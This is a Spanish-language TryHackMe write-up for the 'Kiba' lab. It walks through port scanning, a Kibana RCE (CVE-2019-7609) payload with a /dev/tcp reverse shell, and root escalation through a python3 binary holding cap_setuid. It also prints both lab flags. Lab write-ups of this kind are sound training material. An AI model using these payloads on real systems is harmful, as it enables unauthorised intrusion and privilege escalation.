# Kiba

### tags: `Try Hack Me` `Linux` `Kibana` `CVE-2019-7609` `Shell Reversa` `Capabilities`

## **FLAGS:**

* User Flag: THM{1s\_easy\_pwn3d\_k1bana\_w1th\_rce}
* Root Flag: THM{pr1v1lege\_escalat1on\_us1ng\_capab1l1t1es}

## **USERS:**

* kiba

## **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO \(**Linux**: TTL &lt;= 64\) `ping -c1 IP`

   ![](https://i.imgur.com/b9YJ4a2.png)

2. Escaneamos los puertos abiertos
   * Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

     ```text
       -p-        Todos los puertos
       --open     Mostrar solos puertos abiertos
       -T5        Modo más agresivo
       -v         Modo verbose (reporta por pantalla)
       -n        No aplicar resolución DNS
     ```

   * Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

     ```text
       -sS        Realizar un TCP SYN port scan
       --min-rate    Emitir al menos 5000 paquetes por segundo
       -Pn        No realizar Host Discovery
     ```

     * Va más rápido y encuentra los puertos 22 \(SSH\), 80 \(HTTP\), 5044 y 5601

       ![](https://i.imgur.com/MErhCyx.png)
3. Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80,5044,5601 IP`

   ![](https://i.imgur.com/L62FreF.png)

   * Vemos servicios relacionados con Elasticsearch y Kibana

4. Nos centramos primero en el servidor web. Con whatweb no vemos nada. En portal tampoco hay mucho, vemos esto:

   ![](https://i.imgur.com/Jctaxke.png)

5. Vamos a hacer un fuzzing en el portal para encontrar alguna ruta con GoBuster

   `gobuster dir -u IP -w DICT -q -n -e`

   ```text
        -u        Target 
        -w         Diccionario (/usr/share/wordlists/dirb/common.txt)
        -q        Silencioso, no muestra mensajes de estado           
        -n        No muestra códigos de estado        
        -e        Muestra URLs completas
   ```

   ![](https://i.imgur.com/kGVjTJH.png)

   * Nada interasante, nos centramos en los servicios de Elastic.

6. Si accedemos a [http://IP:5601](http://IP:5601) nos lleva al portal de Kibana.

   ![](https://i.imgur.com/V1BAQmv.png)

   * En management, vemos la versión de Elastic: **6.5.4**

     ![](https://i.imgur.com/9dfL5cs.png)

7. Buscamos "kibana exploit". Encontramos esta info de [Tenable](https://es-la.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability):

## **GET A SHELL**

Vamos a intentar acceder con shell reversa. Usamos [este GitHub](https://github.com/mpgn/CVE-2019-7609) con un exploit.

* Levantamos un puerto en escucha en nuestro Kali:

  `nc -lvp 8443`

* En Kibana, en Timelion copiamos el siguiente payload:

`.es(*).props(label.`**`proto`**`.env.AAAA='require("child`_`process").exec("bash -c`_ ```_``\'bash -i&gt;& /dev/tcp/10.9.5.67/8443 0&gt;&1\'"\);//'\) .props\(label._proto\`_`.env.NODE_OPTIONS='--require /proc/self/environ')`

* Pulsamos sobre Run y luego en el panel de la izquierda, en Canvas.

  ![](https://i.imgur.com/dWz0hJh.png)

* Conseguimos una Shell en el servidor como el usuario kiba.
* Hay un problema con la shell, no podemos levantar una interactiva y al hacer CTRL+C la perdemos. Por la naturaleza del CVE, no se puede repetir el exploit y es necesario reiniciar la máquina.
* Tras varios intentos de reinicio, no somos capaces de volver a conseguir acceso.
* Probamos usando el siguiente [exploit](https://github.com/LandGrey/CVE-2019-7609) en Python.

  ![](https://i.imgur.com/WcQcqOn.png)

  * Además probamos varias veces y se puede ejecutar muchas veces.

* Una vez dentro, configuramos nuestra clave pública SSH para conectarnos al servidor por SSH:

  ![](https://i.imgur.com/VSVPSf7.png)

## **USER FLAG**

Navegamos en el directorio de kiba y vemos la flag

![](https://i.imgur.com/0ihKo02.png)

Tenemos la user flag: **THM{1s\_easy\_pwn3d\_k1bana\_w1th\_rce}**

## **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4). También podemos lanzar este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema.

1. En primer lugar, intentamos ver los privilegios de sudo del usuario kiba. No puede ejecutar el comando `sudo -l` sin password
2. Buscamos los ficheros con el SUID activo. Podemos buscar alguno que nos llame la atención de esta [guía](https://gtfobins.github.io/)

   `find / -user root -perm -4000 2>/dev/null`

   ![](https://i.imgur.com/dxTNEfU.png)

3. Nos llama la intención **/usr/bin/vmware-user-suid-wrapper**. Buscamos información sobre Escalada de Privilegios y encontramos este [CVE](https://www.cvedetails.com/cve/CVE-2017-12579/) y este [exploit](https://www.exploit-db.com/exploits/43223).
   * Lo buscamos con searchsploit y hay bastantes, vamos a probarlos.

     ![](https://i.imgur.com/wqMuVdQ.png)

   * Ninguno sirve, vagrant no está instalado.
4. Probamos a listar las capabilities de Linux con `getcap -r / 2>/dev/null`. Usamos esta [guía](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) para encontrar posibles puntos de acceso.

   ![](https://i.imgur.com/fOwfCr7.png)

   * Encontramos un script en el directorio de kiba que es una copia del binario de python3 y tiene la capability de "**cap\_setuid**".
     * _Esta capability permite que ese script cambie el Effective UID de quién lo ejecuta. Con eso, podemos simular lo que hace el SUID, es decir, hacer que el Effective UID sea 0 \(root\)._
   * Entramos en el directorio y lanzamos lo siguiente:

     `./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

     ![](https://i.imgur.com/SxJ8oHH.png)

5. Hemos escalado privilegios. Vamos al directorio /root a por la 2a Flag.

   Tenemos la root flag: **THM{pr1v1lege\_escalat1on\_us1ng\_capab1l1t1es}**

